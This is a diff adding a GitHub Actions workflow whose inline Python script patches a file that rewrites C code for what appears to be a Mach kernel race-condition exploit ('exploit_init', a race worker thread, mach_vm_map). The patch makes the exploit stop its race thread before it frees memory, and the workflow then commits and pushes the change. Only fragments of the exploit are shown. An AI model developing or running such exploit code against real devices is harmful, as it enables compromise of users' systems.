@@ -1,0 +1,46 @@
+name: Fix Paleramine Calibration Cleanup
+
+on:
+  push:
+    branches:
+      - research/paleramine-no-pc
+    paths:
+      - ".github/workflows/fix-paleramine-calibration-cleanup.yml"
+
+permissions:
+  contents: write
+
+jobs:
+  fix:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: research/paleramine-no-pc
+          fetch-depth: 0
+      - name: Fix worker shutdown and resource teardown order
+        run: |
+          set -euxo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          p = Path('research/paleramine_safe_calibration_patch.py')
+          s = p.read_text()
+          anchor = '''ds = replace_once(\n    ds,\n    'int exploit_init(const char *flavor)\\n{',\n'''
+          worker_patch = '''ds = replace_once(\n    ds,\n    '        while (raceSync == 0);\\n\\n        kern_return_t kr = mach_vm_map(',\n    '        while (raceSync == 0);\\n        if (goSync == 0) break;\\n\\n        kern_return_t kr = mach_vm_map(',\n    "race worker stop check",\n)\n\n'''
+          if worker_patch not in s:
+              if anchor not in s:
+                  raise SystemExit('worker insertion anchor missing')
+              s = s.replace(anchor, worker_patch + anchor, 1)
+
+          old = '''calibration_cleanup:\n    if (calibrationAddress != 0) {\n        surface_munlock(calibrationAddress, calibrationSize);\n    }\n    if (calibrationObject != MACH_PORT_NULL) {\n        mach_port_deallocate(mach_task_self(), calibrationObject);\n    }\n    if (calibrationAddress != 0) {\n        mach_vm_deallocate(mach_task_self(), calibrationAddress, calibrationSize);\n    }\n\n    goSync = 0;\n    raceSync = 1;\n    if (freeThreadStart != 0) {\n        pthread_join(freeThread, NULL);\n    }\n'''
+          new = '''calibration_cleanup:\n    // Stop and join the race worker while every referenced object is still valid.\n    goSync = 0;\n    raceSync = 1;\n    if (freeThreadStart != 0) {\n        pthread_join(freeThread, NULL);\n    }\n\n    if (calibrationAddress != 0) {\n        surface_munlock(calibrationAddress, calibrationSize);\n    }\n    if (calibrationObject != MACH_PORT_NULL) {\n        mach_port_deallocate(mach_task_self(), calibrationObject);\n    }\n    if (calibrationAddress != 0) {\n        mach_vm_deallocate(mach_task_self(), calibrationAddress, calibrationSize);\n    }\n'''
+          if old not in s:
+              raise SystemExit('cleanup block missing')
+          s = s.replace(old, new, 1)
+          p.write_text(s)
+          PY
+          git config user.name github-actions
+          git config user.email github-actions@github.com
+          git add research/paleramine_safe_calibration_patch.py
+          git commit -m 'Fix calibration worker shutdown before resource release'
+          git push origin HEAD:research/paleramine-no-pc
